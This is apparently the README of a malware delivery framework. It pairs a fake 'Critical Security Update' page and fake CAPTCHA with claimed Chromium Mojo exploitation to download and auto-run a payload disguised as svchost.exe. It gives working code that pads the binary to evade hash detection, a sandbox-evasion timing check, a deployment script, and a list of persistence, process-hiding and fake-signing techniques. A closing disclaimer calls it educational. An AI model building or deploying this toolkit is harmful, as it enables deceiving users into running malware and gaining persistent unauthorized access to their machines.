# WASM-gRPC Proxy with Mojo-Based Browser Delivery

A sophisticated proxy system that utilizes WebAssembly (WASM) running on a Node.js gRPC server. The system includes a browser-based delivery mechanism leveraging Chromium's Mojo IPC service.

## Overview

This project implements a stealth network proxy that can be deployed via browser-based delivery. The system consists of:

1. A Node.js server implementing a gRPC interface
2. A WASM module for handling proxy functionality with built-in resolution and redirection
3. Browser-based delivery using Mojo service exploitation in Chromium-based browsers
4. Executable packaging with various anti-detection techniques

## Features

### Node.js gRPC Server
- Stream-based proxy traffic handling
- Tunnel management for various protocols (HTTP, SOCKS5, SSH)
- Configuration management
- Status monitoring

### WASM Module
- Proxy traffic management
- DNS resolution
- Protocol conversion
- Traffic encryption

### Stealth Capabilities
- Process hiding from Task Manager
- Multiple persistence mechanisms
- Privilege elevation attempts
- Anti-detection techniques

### Browser Delivery
- Mojo service exploitation in Chromium-based browsers
- Auto-download and execution capabilities
- Social engineering elements (fake update page, CAPTCHA)
- Defense evasion techniques

## Project Structure

```
├── dist/                   # Output directory for built files
├── src/
│   ├── build.js            # Main build script
│   ├── proto/
│   │   └── proxy.proto     # gRPC protocol definition
│   ├── server/
│   │   ├── index.js        # Main server implementation
│   │   ├── stealth.js      # Process hiding and persistence
│   │   └── wasm-interface.js # WASM module interface
│   ├── wasm/               # WASM module directory
│   └── delivery/
│       ├── mojo-delivery.js # Browser-based delivery code
│       └── build_exe.js    # Executable packaging script
└── package.json           # Project dependencies
```

## Usage

### Installation

```bash
# Install dependencies
npm install

# Optionally install pkg globally for executable packaging
sudo npm install -g pkg
```

### Building

```bash
# Build everything (executable and delivery page)
node src/build.js

# Build only the delivery page
node src/build.js --no-build-exe

# Build with verbose output
node src/build.js --verbose

# Clean build
node src/build.js --clean
```

### Serving

```bash
# Build and start the delivery server
node src/build.js --serve

# Specify a custom port
node src/build.js --serve --port 8888
```

### Customization

```bash
# Custom executable name
node src/build.js --exe-name custom.exe

# Custom page title
node src/build.js --page-title "Critical Security Update"

# Custom payload URL (if hosting elsewhere)
node src/build.js --payload-url "https://example.com/payload.exe"

# Disable auto-execution
node src/build.js --no-auto-execute

# Disable countdown
node src/build.js --countdown 0
```

### Delivery Options

The delivery HTML page can be customized with several options:

- Page title
- Background and text colors
- Logo image
- Countdown timer
- Fake CAPTCHA
- Domain spoofing

## Using Rust-Run as Custom Payload

Tex1step can be integrated with the Rust-Run framework to deliver more sophisticated shellcode execution capabilities. The modified Rust-Run implementation now includes embedded dictionary and payload, eliminating network dependencies while maintaining the original execution flow.

### Prerequisites

1. The Rust-Run project with embedded dictionary and payload 
2. Tex1step project properly installed and configured

### Integrated Deployment Architecture

```
├── tex1step/                # Main delivery framework
│   ├── dist/                # Output for delivery files
│   ├── src/                 # Source code
│   │   ├── build.js         # Main build script
│   │   ├── delivery/        # Delivery mechanisms
│   │   │   ├── custom_payload.js   # Custom handler for Rust-Run
│   │   │   ├── mojo-delivery.js    # Browser delivery code
│   │   │   └── build_exe.js        # Executable packaging
│   │   ├── server/          # Server components
│   │   └── wasm/            # WASM module components
│   ├── payloads/            # Store compiled executables
│   │   └── rust-run.exe     # The compiled Rust-Run payload
│   └── deploy.sh            # Deployment automation script
└── rust-run/                # Shellcode execution framework
    ├── src/
    │   ├── main.rs          # Main executable with embedded payload
    │   └── decoder_test.rs  # Test utility for decoder
    ├── es-dictionary.txt    # Spanish dictionary (now embedded)
    ├── load.txt             # Encoded payload (now embedded)
    └── Cargo.toml           # Rust project manifest
```

### Custom Payload Integration

1. Create a custom payload handler in the Tex1step project:

```javascript
// File: tex1step/src/delivery/custom_payload.js
'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

/**
 * Prepares the Rust-Run payload for delivery
 * Takes the compiled Rust-Run executable and adds randomization
 * to break hash-based detection mechanisms.
 */
function prepareRustRunPayload(options) {
  const {
    sourcePath = path.join(__dirname, '../../payloads/rust-run.exe'),
    outputPath,
    addRandomization = true,
    randomDataSize = 256
  } = options;
  
  console.log(`[+] Preparing Rust-Run payload...`);
  console.log(`[+] Source: ${sourcePath}`);
  console.log(`[+] Destination: ${outputPath}`);
  
  try {
    // Read the source executable
    const exeData = fs.readFileSync(sourcePath);
    
    if (addRandomization) {
      // Add randomization to avoid hash-based detection
      // This appends random data to the end of the file without affecting execution
      const randomBuffer = crypto.randomBytes(randomDataSize);
      const combinedBuffer = Buffer.concat([exeData, randomBuffer]);
      fs.writeFileSync(outputPath, combinedBuffer);
      console.log(`[+] Added ${randomDataSize} bytes of randomization to break hash-based detection`);
    } else {
      // Just copy the file as-is
      fs.copyFileSync(sourcePath, outputPath);
    }
    
    console.log(`[+] Rust-Run payload prepared successfully`);
    return outputPath;
  } catch (err) {
    console.error(`[!] Error preparing Rust-Run payload:`, err);
    throw err;
  }
}

module.exports = {
  prepareRustRunPayload
};
```

2. Modify the `build_exe.js` file to use the custom payload:

```javascript
// Modify build_exe.js to add Rust-Run as a package option
const customPayload = require('./custom_payload');

// Add a new package tool option
const PACKAGE_TOOLS = ['pkg', 'nexe', 'custom-rust-run'];

// In the buildExecutable function:
switch (config.packageTool) {
  case 'custom-rust-run':
    console.log('[+] Using Rust-Run as custom payload');
    const outputPath = path.join(config.outputDir, config.exeName);
    customPayload.prepareRustRunPayload({
      outputPath,
      addRandomization: config.breakSignatureDetection,
      randomDataSize: 512 // Customize as needed
    });
    break;
  
  // Keep other cases as-is
}
```

### Step-by-Step Integration and Deployment Guide

The below steps demonstrate the complete process of integrating the embedded Rust-Run payload with Tex1step for deployment:

1. **Build the Rust-Run Payload**

```bash
# Clone and build Rust-Run with embedded payload
git clone https://github.com/your-username/rust-run.git
cd rust-run

# Build the release version for Windows
cargo build --release --target x86_64-pc-windows-gnu
```

2. **Integrate with Tex1step**

```bash
# Set up the Tex1step project
git clone https://github.com/your-username/tex1step.git
cd tex1step

# Create required directories
mkdir -p payloads

# Copy the Rust-Run payload
cp ../rust-run/target/x86_64-pc-windows-gnu/release/rust-run.exe payloads/

# Create the custom payload handler (as shown above)
# Add to src/delivery/custom_payload.js

# Modify build_exe.js to support Rust-Run (as shown above)
```

3. **Create a Deployment Script**

```bash
#!/bin/bash
# File: deploy.sh

# Set environment variables
PAYLOAD_DIR="./payloads"
PAYLOAD_NAME="rust-run.exe"
DELIVERY_NAME="svchost.exe"
PAGE_TITLE="Critical Security Update Required"
DELIVERY_PORT=8080

# Check if payload exists
if [ ! -f "$PAYLOAD_DIR/$PAYLOAD_NAME" ]; then
  echo "[!] Error: Payload not found at $PAYLOAD_DIR/$PAYLOAD_NAME"
  exit 1
fi

# Build the delivery system
node src/build.js \
  --build-exe \
  --build-delivery \
  --package-tool custom-rust-run \
  --exe-name "$DELIVERY_NAME" \
  --page-title "$PAGE_TITLE" \
  --obfuscate \
  --auto-execute \
  --break-signature-detection \
  --countdown 15

# Start delivery server for testing
if [ "$1" == "--serve" ]; then
  echo "[+] Starting delivery server on port $DELIVERY_PORT..."
  node src/build.js --serve --port $DELIVERY_PORT
fi
```

4. **Execute the Deployment**

```bash
# Make the script executable
chmod +x deploy.sh

# Run the deployment
./deploy.sh

# Or run with server for testing
./deploy.sh --serve
```

### Security Enhancements

The integration of Rust-Run with Tex1step offers several security advantages:

1. **Elimination of Network Dependencies**
   - The embedded payload within Rust-Run eliminates network requests for payload retrieval
   - Reduces detection surface and increases reliability

2. **Layered Evasion Techniques**
   - Rust-Run's anti-analysis techniques remain functional
   - Tex1step adds additional randomization to break hash-based detection
   - Combined evasion techniques from both frameworks

3. **Multiple Delivery Options**
   - Browser-based delivery using Mojo service exploitation
   - File-based delivery options
   - Customizable social engineering elements

4. **Operational Security**
   - Automated build and deployment process
   - Minimal manual intervention required
   - Consistent payload preparation

## Implementation Notes

### Mojo Service Exploitation

The delivery mechanism leverages Chromium's Mojo IPC service to download and execute payloads directly, bypassing standard browser security controls. The implementation includes:

1. **Direct Mojo Interface Access**
   - Exploits the internal IPC mechanism of Chromium-based browsers
   - Interfaces directly with the Mojo system through JavaScript injection:
     ```javascript
     // Access hidden Mojo interfaces using reflection techniques
     const mojoInterface = chrome.webUI && chrome.webUI.getResourceURL ? 
         window.chrome.mojo.internal : 
         (window.chrome.mojo || window.__mojoInternal);
         
     // Bind to privileged interfaces
     const bindInterface = mojoInterface.Connector.bindInterface || 
                           mojoInterface.bindInterface;
     ```
   
2. **Privilege Escalation Chain**
   - Escalates from renderer process to browser process privileges
   - Leverages Mojo pipe connections to cross security boundaries
   - Accesses system-level functions without user permission dialogs

3. **Multi-tiered Fallback System**
   - Attempts Mojo exploitation first for silent operation
   - Falls back to File System Access API when available:
     ```javascript
     async function accessFilesystem() {
       try {
         const dirHandle = await window.showDirectoryPicker({mode: 'readwrite'});
         // Use higher privileges from granted directory access
         return dirHandle;
       } catch (e) {
         console.log('Filesystem API failed, trying download API');
         return false;
       }
     }
     ```
   - Uses standard download API as final fallback with social engineering prompts
   
4. **Browser Fingerprinting**
   - Detects browser version to apply version-specific exploitation techniques
   - Adapts payload delivery based on browser security mechanisms

### Anti-Detection Techniques

The executable incorporates several advanced anti-detection strategies:

1. **Process hiding via Windows API manipulation**
   - Hooks into low-level Windows functions to hide from process enumerators
   - Modifies internal thread data structures to conceal execution

2. **System process name masking**
   - Dynamically selects legitimate Windows system process names (svchost.exe, lsass.exe, etc.)
   - Replicates legitimate system process properties and metadata

3. **Multiple persistence mechanisms**
   - Registry autorun entries with encoded values
   - Scheduled Tasks with system privileges
   - WMI event subscription methods
   - Service creation with misleading descriptions

4. **Sandbox detection and evasion**
   - Time-based detection that identifies accelerated time in sandboxes:
     ```javascript
     // Check for sandbox indicators with timing analysis
     const startTime = Date.now();
     await new Promise(resolve => setTimeout(resolve, sleepTime));
     const endTime = Date.now();
     const actualDelay = endTime - startTime;
     
     // If time difference is too small, might be in a sandbox with time acceleration
     if (actualDelay < sleepTime * 0.9) {
       console.log('[!] Possible sandbox detected (time acceleration). Exiting...');
       process.exit(0);
     }
     ```
   - VM/Hypervisor detection by checking for virtualization artifacts
   - CPU feature checks that reveal analysis environments

5. **Delayed execution techniques**
   - Random sleep intervals to bypass sandbox timeouts
   - Execution triggered by specific system events
   - Multi-stage activation sequences

6. **Code obfuscation**
   - Junk code insertion to confuse static analysis
   - Dead code paths that appear legitimate
   - String encryption for all sensitive strings
   - Control flow obfuscation

7. **Binary protection**
   - PE header manipulation to confuse parsers
   - Fake signing certificates
   - Appended random data to break hash-based detection

## Deployment Scenarios

### Red Team Operations

The system is designed to be deployed as part of a red team assessment, providing a stealthy means to establish persistent access.

### Targeted Delivery

The delivery can be customized for specific targets, with appropriate social engineering content to maximize the likelihood of execution.

## Disclaimer

This tool is developed for educational purposes and legitimate security assessments only. It should only be used against systems you have permission to test.
